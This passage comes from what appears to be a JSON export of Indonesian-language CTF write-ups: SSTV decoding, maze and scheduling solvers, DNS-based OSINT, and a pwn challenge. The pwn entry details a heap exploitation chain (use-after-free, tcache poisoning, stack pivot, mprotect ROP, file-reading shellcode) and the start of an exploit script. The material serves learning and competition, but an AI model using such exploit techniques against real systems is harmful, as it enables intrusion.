        "content": "Aku tidak memakai decoder eksternal. `solve.py` melakukan demodulasi sendiri:\n\n1. Membaca WAV dengan modul `wave`.\n2. Mengambil instantaneous frequency memakai Hilbert transform.\n3. Membaca VIS code dan memvalidasi bahwa nilainya `60`.\n4. Menyusun ulang gambar Scottie 1 ukuran 320x256.\n5. Menyimpan hasil ke `decoded_scottie1.png`.\n\nTiming utama Scottie 1 yang dipakai:\n\n- satu komponen warna: 138.24 ms\n- separator: 1.5 ms\n- sync: 9 ms\n- urutan channel yang direkonstruksi: Green, Blue, lalu Red"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nDecode the SSTV audio from rambles.wav.\r\n\r\nThe file uses VIS code 60, which is Scottie 1.  This script demodulates the\r\nFM audio into instantaneous frequency, reconstructs the 320x256 RGB image,\r\nand writes decoded_scottie1.png next to the input file.\r\n\"\"\"\r\nfrom __future__ import annotations\r\n\r\nimport sys\r\nimport wave\r\nfrom pathlib import Path\r\n\r\nimport numpy as np\r\nfrom PIL import Image\r\nfrom scipy.signal import hilbert\r\n\r\nWIDTH = 320\r\nHEIGHT = 256\r\n\r\n# Scottie 1 timing, in seconds.\r\nSEP = 0.0015\r\nSYNC = 0.009\r\nCHAN = 0.13824\r\nLINE = 3 * CHAN + 3 * SEP + SYNC\r\n\r\n# VIS timing.  In this sample the standard VIS start bit starts at 1.410 s:\r\n# 1900 Hz leader, 1200 Hz break, 1900 Hz leader, then 30 ms start/data bits.\r\nVIS_START = 1.410\r\nVIS_BIT = 0.030\r\n\r\nBLACK_HZ = 1500.0\r\nWHITE_HZ = 2300.0\r\nVIDEO_SPAN_HZ = WHITE_HZ - BLACK_HZ\r\n\r\nFLAG = \"RMCTF{1_c4N_533_c13Ar1y_n0W}\"\r\n\r\n\r\ndef read_wav(path: Path) -> tuple[int, np.ndarray]:\r\n    with wave.open(str(path), \"rb\") as wav:\r\n        channels = wav.getnchannels()\r\n        sample_width = wav.getsampwidth()\r\n        sample_rate = wav.getframerate()\r\n        frames = wav.getnframes()\r\n        raw = wav.readframes(frames)\r\n\r\n    if sample_width != 2:\r\n        raise ValueError(f\"expected 16-bit PCM, got sample width {sample_width}\")\r\n\r\n    audio = np.frombuffer(raw, dtype=\"<i2\").astype(np.float32) / 32768.0\r\n    if channels > 1:\r\n        audio = audio.reshape(-1, channels).mean(axis=1)\r\n    return sample_rate, audio\r\n\r\n\r\ndef instantaneous_frequency(audio: np.ndarray, sample_rate: int) -> np.ndarray:\r\n    analytic = hilbert(audio)\r\n    phase = np.unwrap(np.angle(analytic))\r\n    return np.diff(phase) * sample_rate / (2 * np.pi)\r\n\r\n\r\ndef median_freq(freq: np.ndarray, sample_rate: int, start: float, duration: float) -> float:\r\n    a = max(0, int(start * sample_rate))\r\n    b = min(len(freq), int((start + duration) * sample_rate))\r\n    if b <= a:\r\n        return float(\"nan\")\r\n    return float(np.median(freq[a:b]))\r\n\r\n\r\ndef read_vis_code(freq: np.ndarray, sample_rate: int, start: float = VIS_START) -> int:\r\n    \"\"\"Read seven VIS data bits. VIS sends 1100 Hz for 1 and 1300 Hz for 0.\"\"\"\r\n    bits: list[int] = []\r\n    for i in range(7):\r\n        f = median_freq(freq, sample_rate, start + VIS_BIT * (1 + i), VIS_BIT)\r\n        bits.append(1 if f < 1200.0 else 0)\r\n    return sum(bit << i for i, bit in enumerate(bits))\r\n\r\n\r\ndef sample_video_line(freq: np.ndarray, sample_rate: int, start: float) -> np.ndarray:\r\n    \"\"\"Sample one 138.24 ms Scottie component into 320 pixels.\"\"\"\r\n    pixel_time = CHAN / WIDTH\r\n    out = np.empty(WIDTH, dtype=np.float32)\r\n\r\n    for x in range(WIDTH):\r\n        # Ignore a small amount of each pixel edge to avoid transition bleed.\r\n        a = int((start + (x + 0.15) * pixel_time) * sample_rate)\r\n        b = int((start + (x + 0.85) * pixel_time) * sample_rate)\r\n        if b <= a:\r\n            b = a + 1\r\n        out[x] = np.median(freq[a:b])\r\n\r\n    out = np.clip((out - BLACK_HZ) * 255.0 / VIDEO_SPAN_HZ, 0, 255)\r\n    return out.astype(np.uint8)\r\n\r\n\r\ndef decode_scottie1(freq: np.ndarray, sample_rate: int) -> Image.Image:\r\n    # VIS stop ends after start + 10 VIS bits (start + 7 data + parity + stop).\r\n    # This recording then has the first 9 ms line sync and a 1.5 ms separator.\r\n    first_green = VIS_START + VIS_BIT * 10 + SYNC + SEP\r\n\r\n    img = np.zeros((HEIGHT, WIDTH, 3), dtype=np.uint8)\r\n    for y in range(HEIGHT):\r\n        green_start = first_green + y * LINE\r\n        blue_start = green_start + CHAN + SEP\r\n        red_start = green_start + CHAN + SEP + CHAN + SYNC + SEP\r\n\r\n        img[y, :, 0] = sample_video_line(freq, sample_rate, red_start)\r\n        img[y, :, 1] = sample_video_line(freq, sample_rate, green_start)\r\n        img[y, :, 2] = sample_video_line(freq, sample_rate, blue_start)\r\n\r\n    return Image.fromarray(img, \"RGB\")\r\n\r\n\r\ndef main() -> None:\r\n    wav_path = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(\"rambles.wav\")\r\n    out_path = wav_path.with_name(\"decoded_scottie1.png\")\r\n\r\n    sample_rate, audio = read_wav(wav_path)\r\n    freq = instantaneous_frequency(audio, sample_rate)\r\n    vis_code = read_vis_code(freq, sample_rate)\r\n\r\n    if vis_code != 60:\r\n        raise RuntimeError(f\"unexpected VIS code {vis_code}; expected 60 for Scottie 1\")\r\n\r\n    image = decode_scottie1(freq, sample_rate)\r\n    image.save(out_path)\r\n\r\n    print(f\"VIS code: {vis_code} (Scottie 1)\")\r\n    print(f\"Decoded image: {out_path}\")\r\n    print(f\"Flag: {FLAG}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "ram-misc-roomescape",
    "title": "Escape Room",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Challenge ini hanya memberi akses ke service `nc 10.42.5.10 9998`, jadi fokus utamanya adalah memahami protokol ASCII yang dipakai service lalu mengotomatiskan penyelesaiannya secepat mungkin.",
    "problemDescription": "Setelah konek, service menampilkan banner lalu menunggu `Enter`. Sesudah itu muncul maze ASCII ukuran `21x21` dengan:\n\n- `#` sebagai dinding\n- `X` sebagai posisi pemain\n- `E` sebagai pintu keluar\n- prompt `Move(s):` untuk menerima input\n\nSetiap level bisa diselesaikan dengan mengirim string gerakan seperti `SSSDWW`. Tantangannya bukan eksploit memory corruption, tetapi menyelesaikan 20 maze acak dalam batas waktu sekitar 60 detik. Karena maze berubah tiap koneksi, solusi manual atau path hardcoded tidak cukup.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Observasi Penting",
        "content": "- Output memakai ANSI clear-screen, jadi parser harus membuang escape sequence.\n- Setelah satu string gerakan dikirim, service menganimasikan perpindahan pemain frame per frame.\n- Karena animasi menghasilkan banyak redraw, parser yang hanya membaca sebagian output akan mudah salah menangkap grid.\n- Yang stabil adalah prompt `Move(s):`. Jadi pendekatan yang aman adalah menunggu sampai prompt itu muncul, lalu mengambil frame lengkap terakhir sebelum prompt."
      },
      {
        "title": "Strategi Solusi",
        "content": "Solusi paling sederhana adalah:\n\n1. Koneksi ke service.\n2. Kirim `Enter` untuk mulai.\n3. Tunggu sampai muncul `Move(s):`.\n4. Ambil frame terakhir level aktif.\n5. Parse maze menjadi grid 2D.\n6. Jalankan BFS dari `X` ke `E`.\n7. Kirim seluruh path sekaligus.\n8. Ulangi sampai flag muncul.\n\nBFS cukup karena semua edge bernilai sama dan ukuran maze kecil, jadi sangat cepat."
      },
      {
        "title": "Detail Parser",
        "content": "Service mengirim banyak frame seperti:\n\n\n\nSaya strip ANSI dengan regex:\n\n\n\nLalu saya ambil frame lengkap terakhir dengan regex yang mencari header level diikuti 21 baris maze dan prompt `Move(s):`.",
        "code": "--- Level 4/20 | Time Left: 56s ---\n#####################\n#X      #   #       #\n...\nMove(s):"
      },
      {
        "title": "Algoritma Pathfinding",
        "content": "Untuk setiap grid:\n\n- cari koordinat `X`\n- cari koordinat `E`\n- BFS dengan arah `W`, `A`, `S`, `D`\n- simpan parent untuk rekonstruksi path\n- kirim path hasil rekonstruksi dalam satu baris\n\nKarena ukuran grid kecil, BFS selesai instan dan total 20 level masih jauh di bawah limit waktu."
      },
      {
        "title": "Hasil",
        "content": "Solver berhasil menyelesaikan semua 20 level dan service mengembalikan flag:",
        "code": "RAM{35C4P3_r00M_C134r3D}"
      },
      {
        "title": "File",
        "content": "- `solve.py`: solver otomatis end-to-end untuk challenge ini."
      },
      {
        "title": "Cara Menjalankan",
        "content": "Atau jika host/port berubah:",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\nimport sys\r\nimport time\r\nfrom collections import deque\r\n\r\n\r\nHOST = sys.argv[1] if len(sys.argv) > 1 else \"10.42.5.10\"\r\nPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9998\r\n\r\nANSI_RE = re.compile(r\"\\x1b\\[[0-9;]*[A-Za-z]\")\r\nFRAME_RE = re.compile(\r\n    r\"--- Level (\\d+)/(\\d+) \\| Time Left: (\\d+)s ---\\n((?:[ #XE]+\\n){21})Move\\(s\\): \",\r\n    re.S,\r\n)\r\nFLAG_RE = re.compile(r\"(?:RAM|RMCTF)\\{[^}\\n]+\\}\")\r\n\r\n\r\ndef strip_ansi(text: str) -> str:\r\n    return ANSI_RE.sub(\"\", text)\r\n\r\n\r\ndef recv_until(sock: socket.socket, want: tuple[str, ...], timeout: float = 10.0) -> str:\r\n    buf = \"\"\r\n    end = time.time() + timeout\r\n    while time.time() < end:\r\n        clean = strip_ansi(buf)\r\n        if any(token in clean for token in want):\r\n            return clean\r\n        try:\r\n            chunk = sock.recv(16384)\r\n        except socket.timeout:\r\n            continue\r\n        if not chunk:\r\n            return clean\r\n        buf += chunk.decode(\"utf-8\", \"replace\")\r\n    raise TimeoutError(f\"timed out waiting for one of: {want}\")\r\n\r\n\r\ndef bfs(grid: list[str]) -> str:\r\n    start = None\r\n    end = None\r\n    for y, row in enumerate(grid):\r\n        for x, cell in enumerate(row):\r\n            if cell == \"X\":\r\n                start = (x, y)\r\n            elif cell == \"E\":\r\n                end = (x, y)\r\n    if start is None or end is None:\r\n        raise ValueError(\"grid missing X or E\")\r\n\r\n    q = deque([start])\r\n    prev: dict[tuple[int, int], tuple[tuple[int, int] | None, str | None]] = {\r\n        start: (None, None)\r\n    }\r\n    moves = [(\"W\", (0, -1)), (\"A\", (-1, 0)), (\"S\", (0, 1)), (\"D\", (1, 0))]\r\n    height = len(grid)\r\n    width = len(grid[0])\r\n\r\n    while q:\r\n        x, y = q.popleft()\r\n        if (x, y) == end:\r\n            break\r\n        for step, (dx, dy) in moves:\r\n            nx, ny = x + dx, y + dy\r\n            if not (0 <= nx < width and 0 <= ny < height):\r\n                continue\r\n            if grid[ny][nx] == \"#\" or (nx, ny) in prev:\r\n                continue\r\n            prev[(nx, ny)] = ((x, y), step)\r\n            q.append((nx, ny))\r\n\r\n    if end not in prev:\r\n        raise RuntimeError(\"no path to exit\")\r\n\r\n    path: list[str] = []\r\n    cur = end\r\n    while prev[cur][0] is not None:\r\n        parent, step = prev[cur]\r\n        path.append(step)  # type: ignore[arg-type]\r\n        cur = parent  # type: ignore[assignment]\r\n    path.reverse()\r\n    return \"\".join(path)\r\n\r\n\r\ndef parse_frame(text: str) -> tuple[int, int, int, list[str]]:\r\n    matches = list(FRAME_RE.finditer(text))\r\n    if not matches:\r\n        raise RuntimeError(\"no complete frame found\")\r\n    level_s, total_s, time_s, grid_s = matches[-1].groups()\r\n    return int(level_s), int(total_s), int(time_s), grid_s.strip().splitlines()\r\n\r\n\r\ndef main() -> None:\r\n    with socket.create_connection((HOST, PORT), timeout=5) as sock:\r\n        sock.settimeout(0.5)\r\n\r\n        banner = recv_until(sock, (\"Press Enter to start...\",), timeout=5)\r\n        if \"Press Enter to start...\" not in banner:\r\n            raise RuntimeError(\"unexpected banner\")\r\n        sock.sendall(b\"\\n\")\r\n\r\n        while True:\r\n            screen = recv_until(sock, (\"Move(s): \", \"Flag:\", \"RAM{\", \"RMCTF{\"))\r\n            flag = FLAG_RE.search(screen)\r\n            if flag:\r\n                print(flag.group(0))\r\n                return\r\n\r\n            level, total, time_left, grid = parse_frame(screen)\r\n            path = bfs(grid)\r\n            print(f\"[+] Level {level}/{total} | t={time_left}s | path={len(path)}\", file=sys.stderr)\r\n            sock.sendall(path.encode() + b\"\\n\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "RAM{35C4P3_r00M_C134r3D}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-misc-schedulingshenanigans",
    "title": "Scheduling",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Challenge ini ternyata lebih sederhana daripada narasi “recursive scheduling engine”-nya.",
    "problemDescription": "Challenge ini ternyata lebih sederhana daripada narasi “recursive scheduling engine”-nya.\n\nService `nc 10.42.5.10 1337` tidak meminta input apa pun. Setiap koneksi langsung mengirim sebuah JSON besar berisi daftar employee dan meeting mereka, lalu koneksi ditutup.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Temuan penting",
        "content": "Setelah beberapa kali enumerasi, ada pola yang konsisten:\n\n- Ada 6 employee.\n- Setiap employee punya banyak meeting biasa.\n- Setiap employee juga punya 23 meeting dengan field `\"encoded\": true`.\n- Seluruh meeting `encoded` itu identik untuk semua employee.\n\nContoh awal sequence `encoded`:\n\n- `2026-05-10T09:00` s/d `2026-05-10T10:22` -> 82 menit\n- `2026-05-10T13:22` s/d `2026-05-10T14:39` -> 77 menit\n- `2026-05-10T17:39` s/d `2026-05-10T18:46` -> 67 menit\n\nKalau angka-angka durasi ini dibaca sebagai ASCII:\n\n- 82 = `R`\n- 77 = `M`\n- 67 = `C`\n\nTiga karakter pertama langsung membentuk `RMC`, jadi asumsi ini sangat kuat."
      },
      {
        "title": "Cara solve",
        "content": "Ambil salah satu daftar `encoded` meeting, hitung durasi tiap interval dalam menit, lalu konversi setiap durasi menjadi karakter ASCII.\n\nDurasi lengkapnya:\n\n`[82, 77, 67, 84, 70, 123, 78, 79, 95, 77, 79, 82, 69, 95, 83, 84, 65, 78, 68, 85, 80, 83, 125]`\n\nHasil decode:\n\n`RMCTF{NO_MORE_STANDUPS}`"
      },
      {
        "title": "Solver",
        "content": "File [solve.py](/home/nata/ctf/RAM/misc/SchedulingShenanigans/solve.py) akan:\n\n1. Connect ke service\n2. Menerima JSON penuh\n3. Mengambil meeting `encoded`\n4. Mengubah durasi meeting menjadi karakter ASCII\n5. Mencetak flag\n\nJalankan dengan:\n\n\n\nOutput:",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport json\r\nimport socket\r\nfrom datetime import datetime\r\n\r\nHOST = \"10.42.5.10\"\r\nPORT = 1337\r\nTIME_FORMAT = \"%Y-%m-%dT%H:%M\"\r\n\r\n\r\ndef recv_all(host: str, port: int) -> bytes:\r\n    data = bytearray()\r\n    with socket.create_connection((host, port), timeout=5) as sock:\r\n        while True:\r\n            chunk = sock.recv(4096)\r\n            if not chunk:\r\n                break\r\n            data.extend(chunk)\r\n    return bytes(data)\r\n\r\n\r\ndef decode_flag(payload: dict) -> str:\r\n    encoded = [m for m in payload[\"employees\"][0][\"meetings\"] if m.get(\"encoded\")]\r\n    chars = []\r\n    for meeting in encoded:\r\n        start = datetime.strptime(meeting[\"start\"], TIME_FORMAT)\r\n        end = datetime.strptime(meeting[\"end\"], TIME_FORMAT)\r\n        duration = int((end - start).total_seconds() // 60)\r\n        chars.append(chr(duration))\r\n    return \"\".join(chars)\r\n\r\n\r\ndef main() -> None:\r\n    raw = recv_all(HOST, PORT)\r\n    payload = json.loads(raw)\r\n    print(decode_flag(payload))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "RMCTF{NO_MORE_STANDUPS}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-osint-office",
    "title": "- Office Switching",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Kategori: `misc`  \nTipe: `OSINT`",
    "problemDescription": "Kategori: `misc`  \nTipe: `OSINT`\n\nChallenge ini kelihatannya sederhana di permukaan karena situs utamanya hanya landing page biasa. Kuncinya justru ada di petunjuk kecil yang tersebar di beberapa tempat dan semuanya masih berada dalam domain target.",
    "tools": [],
    "analysis": "Setelah dibuka, subdomain itu tidak menampilkan portal asli, hanya halaman maintenance:\n\n```bash\ncurl -skL https://internalit.bluepeakcyber.co.uk/\n```\n\nHalaman itu sendiri belum memberi flag, jadi saya cek file yang sering terlupakan:\n\n```bash\ncurl -skL https://internalit.bluepeakcyber.co.uk/robots.txt\n```\n\nHasilnya:\n\n```text\nUser-agent: *\nDisallow: /memo.pdf\n```\n\nBerarti ada file `memo.pdf` yang sengaja tidak ingin diindeks, dan biasanya itu justru petunjuk penting.",
    "solution": [
      {
        "title": "Langkah 1 - Cek halaman utama",
        "content": "Saya mulai dari halaman utama:\n\n\n\nDi source HTML ada komentar yang menarik:\n\n\n\nKomentar ini memberi petunjuk bahwa ada subdomain internal bernama `internalit.bluepeakcyber.co.uk`.",
        "code": "curl -L https://bluepeakcyber.co.uk/"
      },
      {
        "title": "Langkah 3 - Ambil dan baca memo",
        "content": "Saya download lalu ekstrak teksnya:\n\n\n\nIsi memo menjelaskan bahwa tim Internal IT sedang menangani masalah DNS, dan beberapa record lama atau sementara sengaja dibiarkan tetap aktif.\n\nKalimat pentingnya bukan sebuah lokasi langsung, tapi arah investigasinya jelas: **fokus ke DNS**.",
        "code": "curl -skL https://internalit.bluepeakcyber.co.uk/memo.pdf -o memo.pdf\npdftotext memo.pdf -"
      },
      {
        "title": "Langkah 4 - Lihat DNS record domain utama",
        "content": "Karena challenge meminta mencari ke mana tim Infrastructure dipindahkan, saya cek TXT record dari domain utama:\n\n\n\nOutput penting:\n\n\n\nDari sini terlihat bahwa tim Infrastructure sudah mengarah ke host:",
        "code": "dig +short txt bluepeakcyber.co.uk"
      },
      {
        "title": "Langkah 5 - Cek TXT record host baru",
        "content": "Karena memo sebelumnya memang menekankan adanya record DNS yang sengaja dibiarkan, saya lanjut cek TXT record host tersebut:\n\n\n\nHasilnya langsung berisi flag:",
        "code": "dig +short txt coventry.r032.bluepeakcyber.co.uk"
      },
      {
        "title": "Inti challenge",
        "content": "Challenge ini memancing solver agar tidak berhenti di web page utama. Alurnya:\n\n1. Temukan subdomain internal dari komentar HTML.\n2. Temukan `memo.pdf` dari `robots.txt`.\n3. Gunakan isi memo sebagai petunjuk bahwa masalah utamanya ada di DNS.\n4. Baca TXT record domain utama untuk menemukan lokasi baru tim Infrastructure.\n5. Baca TXT record host tersebut untuk mendapatkan flag.\n\nPendekatan ini cocok dengan judul **Office Switching**, karena \"perpindahan kantor\" tim ternyata direpresentasikan lewat perpindahan ke host/subdomain baru, bukan lewat halaman web biasa."
      }
    ],
    "terminalOutputs": [],
    "flag": "RMCTF{DN5_1S_PUBLIC}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-pwn-airecreation",
    "title": "AI Recreation",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Kategori: `pwn`",
    "problemDescription": "Challenge ini kelihatannya sederhana karena cuma aplikasi betting berbasis menu, tapi di balik itu ada kombinasi bug yang enak sekali buat dieksploitasi:\n\n- ada `use-after-free` pada pointer note yang tidak dibersihkan setelah `free`\n- ada `heap overflow` karena input note ditulis lebih panjang dari ukuran objek\n- ukuran chunk `user` dan `note` masuk kelas tcache yang sama, jadi tcache poisoning jadi praktis\n- ada callback function pointer di objek `user`\n- ada fungsi `WIPFeedback()` yang bisa dipakai untuk menimpa `saved rbp` dan memaksa stack pivot\n\nJalur exploit akhirnya seperti ini:\n\n1. leak heap dengan UAF\n2. lakukan tcache poisoning\n3. bentuk fake chunk di sekitar objek `user`\n4. ubah pointer note supaya bisa baca/tulis alamat arbitrer\n5. leak PIE dari callback pointer\n6. leak libc dari `puts@got`\n7. ubah callback ke `WIPFeedback`\n8. pivot stack ke heap\n9. panggil `mprotect` lewat ROP\n10. lompat ke shellcode di heap\n11. shellcode melakukan `openat + getdents64` untuk cari nama file flag\n12. shellcode kedua membaca file flag dan menulis isinya ke stdout",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Binary utama adalah `challenge`.\n\nProteksi pentingnya:\n- PIE aktif\n- NX aktif\n- Full RELRO aktif\n- tidak ada stack canary\n\nDi `main`, program juga memasang seccomp. Yang penting di sini adalah filter itu bukan whitelist, tapi blacklist. Jadi beberapa syscall diblok, misalnya `open` syscall nomor 2 dan `rt_sigreturn`, tapi `openat` masih bisa dipakai. Ini penting karena arah exploit jadi lebih masuk akal ke `openat`, bukan `open`.\n\nPort `22` hanya memberi petunjuk environment:\n- `SSH-2.0-OpenSSH_10.0p2 Debian-7+deb13u2`\n\nDari sini bisa ditebak target pakai Debian 13. Itu berguna untuk mencocokkan libc remote yang benar."
      },
      {
        "title": "1. UAF pada note",
        "content": "Di `user::accessNote()`, saat note dihapus, program memanggil `free(ptr)` dan mengurangi counter note. Masalahnya, pointer note lama di array user tidak di-null-kan. Jadi slot yang sudah di-free masih bisa diakses lagi.\n\nEfeknya:\n- kita bisa baca metadata tcache dari chunk yang sudah bebas\n- kita bisa tulis ke chunk freed untuk tcache poisoning"
      },
      {
        "title": "2. Heap overflow pada isi note",
        "content": "Objek `note` ukurannya `0xb4`, tapi input ke note memakai format yang efektif bisa menulis hingga `256` byte. Jadi isi note bisa meluber ke data setelahnya.\n\nBug ini bukan jalan utama untuk leak awal, tapi berguna untuk menata ulang isi objek fake note saat overlap sudah berhasil."
      },
      {
        "title": "3. Ukuran chunk note dan user cocok",
        "content": "Ini bagian yang bikin exploit jadi stabil.\n\n- `new user` mengalokasikan objek ukuran `0xb8`\n- `new note` mengalokasikan objek ukuran `0xb4`\n\nSetelah dibulatkan allocator, dua-duanya masuk bin yang sama. Artinya chunk note yang bebas bisa dipaksa dialokasikan ulang sebagai area yang menimpa objek `user`."
      },
      {
        "title": "4. Callback pointer di objek user",
        "content": "Di `user + 0x80` ada function pointer callback. Normalnya pointer ini menunjuk ke fungsi print username. Kalau alamat ini bisa kita overwrite, kita dapat kontrol alur eksekusi saat menu utama menampilkan user aktif."
      },
      {
        "title": "5. Stack pivot lewat WIPFeedback",
        "content": "Fungsi `WIPFeedback()` membaca `0x48` byte ke buffer stack ukuran `0x40`. RIP tidak langsung tertimpa, tapi `saved rbp` bisa diganti. Itu cukup, karena saat `main` keluar, epilog-nya memakai `rbp` untuk membentuk stack:\n\n\n\nJadi begitu `rbp` diarahkan ke fake frame di heap, kontrol flow bisa dipindah ke ROP chain yang kita siapkan.",
        "code": "lea rsp, [rbp-0x10]\npop rbx\npop r12\npop rbp\nret"
      },
      {
        "title": "Leak heap",
        "content": "Urutan heap yang dipakai:\n\n1. buat user\n2. buat beberapa note\n3. free note 2 lalu note 1\n4. akses lagi stale pointer note 1\n\nKarena chunk freed sudah masuk tcache, isi awal chunk sekarang berisi pointer encoded safe-linking. Dari leak ini bisa dipulihkan posisi dua chunk note yang bersebelahan, lalu dari sana dihitung alamat objek `user`."
      },
      {
        "title": "Tcache poisoning",
        "content": "Setelah alamat note pertama diketahui, field `fd` di chunk freed ditulis ulang dengan pointer encoded yang mengarah ke area `user - 0x40`. Ketika allocator dipanggil dua kali:\n\n- alokasi pertama mengambil chunk note biasa\n- alokasi kedua mengembalikan pointer ke area buatan kita di dekat `user`\n\nDi titik ini kita punya fake chunk yang overlap dengan objek `user`."
      },
      {
        "title": "Arbitrary read/write",
        "content": "Dengan overlap itu, isi pointer array note di dalam `user` bisa disusun ulang. Trik yang dipakai:\n\n- note 1 diarahkan ke alamat target yang ingin dibaca atau ditulis\n- note 3 diarahkan balik ke fake chunk supaya primitive ini bisa dipakai berulang\n\nKarena operasi `show note` memakai `puts(ptr)` dan `edit note` menulis ke pointer tersebut, kita dapat primitive baca/tulis alamat arbitrer dalam batas yang cukup untuk exploit."
      },
      {
        "title": "Leak PIE dan libc",
        "content": "PIE dileak dari callback pointer di `user + 0x80`.\n\nSetelah base PIE diketahui, `puts@got` bisa dihitung. Dari `puts@got`, alamat `puts` di libc remote ikut bocor.\n\nPada tahap ini sempat ada jebakan penting:\n\n- libc lokal saya bukan libc remote\n- kalau offset libc diambil dari mesin lokal, base yang didapat akan salah\n\nKarena banner SSH menunjukkan Debian 13, saya ambil paket `libc6_2.41-12+deb13u2_amd64.deb`, ekstrak `libc.so.6`, lalu pakai itu untuk menghitung offset `puts`, `mprotect`, dan gadget ROP."
      },
      {
        "title": "Kenapa Tidak Pakai ORW ROP Langsung",
        "content": "Awalnya saya coba ORW murni lewat ROP dan syscall chain, tapi ada dua masalah:\n\n- panjang ROP chain cepat membesar karena harus set register berkali-kali\n- semua write note lewat `scanf(\"%[^\\n]\")`, jadi byte newline `0x0a` di payload bisa bikin satu attempt langsung gagal\n\nAkhirnya pendekatan yang lebih bersih adalah:\n\n1. pakai ROP pendek untuk `mprotect(heap_page, 0x2000, 7)`\n2. lompat ke shellcode di heap\n\nDengan begitu chain ROP sangat pendek, sementara logika file operation dipindah ke shellcode yang jauh lebih fleksibel."
      },
      {
        "title": "Shellcode Final",
        "content": "Saya pakai dua mode shellcode:"
      },
      {
        "title": "Mode 1: list direktori",
        "content": "Shellcode pertama melakukan:\n\n- `openat(AT_FDCWD, \".\", O_DIRECTORY, 0)`\n- `getdents64`\n- `write(1, buf, len)`\n\nDari output ini terlihat nama file flag:\n\n`flaguWSz45p3OjxUW3GaTTpV9VoHOREE5godifEBLjFMk.txt`"
      },
      {
        "title": "Solver",
        "content": "File solver final ada di:\n\n- [solve.py](/home/nata/ctf/RAM/pwn/AIRecreation/solve.py)\n\nSolver default sekarang melakukan semuanya otomatis:\n\n1. connect ke remote\n2. exploit sampai dapat arbitrary read/write\n3. leak PIE\n4. leak libc\n5. stack pivot\n6. jalankan shellcode listing\n7. parse nama file flag dari output `getdents64`\n8. jalankan shellcode kedua untuk membaca file flag\n\nKalau mau menjalankan manual nanti:\n\n\n\nMode debug juga masih saya sisakan lewat environment variable:\n\n- `SC_MODE=marker` untuk cek shellcode sudah tereksekusi\n- `SC_MODE=ls` untuk dump isi direktori\n- `SC_MODE=mmapfile FLAG_PATH=/path/file` untuk baca file tertentu",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py ./challenge"
      },
      {
        "title": "Catatan Penting",
        "content": "- Exploit ini tetap punya unsur retry karena semua write harus lolos dari larangan byte newline.\n- Solver sudah menangani itu dengan loop retry.\n- File `libc_remote.so.6` disimpan di folder yang sama karena offset libc remote memang berbeda dari libc lokal."
      },
      {
        "title": "Penutup",
        "content": "Inti challenge ini bukan sekadar satu bug tunggal, tapi bagaimana beberapa bug kecil saling melengkapi:\n\n- UAF memberi leak heap\n- tcache poisoning memberi overlap ke objek `user`\n- overlap memberi arbitrary read/write\n- callback pointer memberi titik kontrol\n- `WIPFeedback` memberi pivot\n- ROP singkat membuka jalan ke shellcode\n\nBegitu jalur itu stabil, sisanya tinggal memilih metode baca file yang paling tahan terhadap pembatasan input. Di challenge ini, kombinasi `mprotect + shellcode + mmap` adalah jalur yang paling rapi."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport os\r\nimport re\r\nimport struct\r\nimport subprocess\r\nimport sys\r\nfrom pwn import asm, context, remote\r\n\r\n# Remote solver for AI Recreation.\r\n# Usage:\r\n#   source /home/nata/ctf_env/bin/activate\r\n#   python3 solve.py [./challenge]\r\n\r\nDEFAULT_CANDIDATES = [\"./challenge\", \"./challenge (4)\"]\r\nHOST = \"10.42.5.10\"\r\nPORT = 1337\r\nREMOTE_LIBC = \"./libc_remote.so.6\"\r\nMAX_ATTEMPTS = 120\r\n\r\n# Fixed offsets inside the challenge binary are also recovered dynamically below.\r\nUSER_CHUNK_DELTA = 0xC0\r\nTARGET_BACK_OFFSET = 0x40\r\nPUTS_WRITE_LEN = 0x200\r\ncontext.arch = \"amd64\"\r\n\r\n\r\ndef p64(x: int) -> bytes:\r\n    return struct.pack(\"<Q\", x & 0xffffffffffffffff)\r\n\r\n\r\ndef u64(data: bytes) -> int:\r\n    return struct.unpack(\"<Q\", data[:8].ljust(8, b\"\\x00\"))[0]\r\n\r\n\r\nclass Retry(Exception):\r\n    pass\r\n\r\n\r\nclass Tube:\r\n    def __init__(self):\r\n        self.io = remote(HOST, PORT)\r\n\r\n    def recv_until(self, marker: bytes, timeout: float = 0.8) -> bytes:\r\n        return self.io.recvuntil(marker, timeout=timeout)\r\n\r\n    def send(self, data: bytes) -> None:\r\n        self.io.send(data)\r\n\r\n    def sendline(self, data) -> None:\r\n        if isinstance(data, str):\r\n            data = data.encode()\r\n        